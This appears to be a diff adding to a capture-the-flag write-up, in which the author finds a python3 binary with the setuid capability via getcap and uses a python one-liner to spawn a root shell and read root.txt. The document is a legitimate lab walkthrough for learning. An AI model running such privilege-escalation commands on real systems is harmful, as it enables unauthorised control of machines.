@@ -175,3 +175,35 @@ I then cat the file in that directory:
 $ cat /home/kiba/user.txt
 REDACTED
 ```
+
+## How would you recursively list all of these capabilities?
+
+Since I am not familiar with linux capabilities, I did a google search and found the `getcap` command. I looked at the documentation for this command by running:
+
+```bash
+$ man getcap
+```
+
+As I read the documentation, I found that the -r flag does a recursive search. So the command is the following:
+
+```bash
+$ getcap -r / 2>/dev/null
+/home/kiba/.hackmeplease/python3 = cap_setuid+ep
+```
+
+I added the `2>/dev/null` because I only want successful values. The entry it returned is very interesting.
+
+## Escalate privileges and obtain root.txt
+
+All I had to do was create a shell as root using the python3 at the location above. Here is the command I ran:
+
+```bash
+$ /home/kiba/.hackmeplease/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
+```
+
+It worked. I'm in! The cursor changed to the # character to let me know that I am root. I ran the following to get the flag:
+
+```bash
+# cat /root/root.txt
+REDACTED
+```
